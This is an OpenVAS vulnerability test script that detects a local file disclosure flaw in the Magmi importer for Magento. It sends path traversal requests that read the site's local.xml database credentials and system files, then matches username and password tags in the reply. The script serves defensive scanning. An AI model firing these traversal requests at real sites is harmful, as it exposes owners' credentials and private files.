###############################################################################
# OpenVAS Vulnerability Test
#
# Magmi database client for Magento Local File Disclosure Vulnerability
#
# Authors:
# Christian Fischer <info@schutzwerk.com>
#
# Copyright:
# Copyright (C) 2015 SCHUTZWERK GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:magmi_project:magmi";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.111041");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2015-10-14 18:00:00 +0200 (Wed, 14 Oct 2015)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Magmi (Magento Mass Importer) Local File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 SCHUTZWERK GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_magento_magmi_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("magmi/detected");

  script_xref(name:"URL", value:"https://www.trustwave.com/Resources/SpiderLabs-Blog/Zero-day-in-Magmi-database-client-for-popular-e-commerce-platform-Magento-targeted-in-the-wild/");
  script_xref(name:"URL", value:"http://wiki.magmi.org/index.php?title=Securing_Magmi_UI_access");

  script_tag(name:"summary", value:"Magmi is prone to a file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and
  check whether it is possible to get sensitive information.");

  script_tag(name:"insight", value:"Magmi does not sufficiently sanitize input submitted via
  URI parameters of potentially malicious data. This issue exists in the download_file.php script.");

  script_tag(name:"impact", value:"By submitting a malicious web request
  to this script that contains a relative path to a resource, it is possible to retrieve
  arbitrary files that are readable by the web server process.");

  script_tag(name:"affected", value:"Magmi 0.7.21 is known to be affected. Other versions might
  be affected as well.");

  script_tag(name:"solution", value:"Please see the reference how to secure the Magmi UI access.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/web/download_file.php?file=../../app/etc/local.xml";

if( http_vuln_check( port:port, url:url, pattern:"<username>.*</username>", extra_check:"<password>.*</password>" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

files = traversal_files();

foreach file( keys( files ) ) {
  url = dir + "/web/download_file.php?file=" + crap( data:"../../", length:45 ) + files[file];
  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
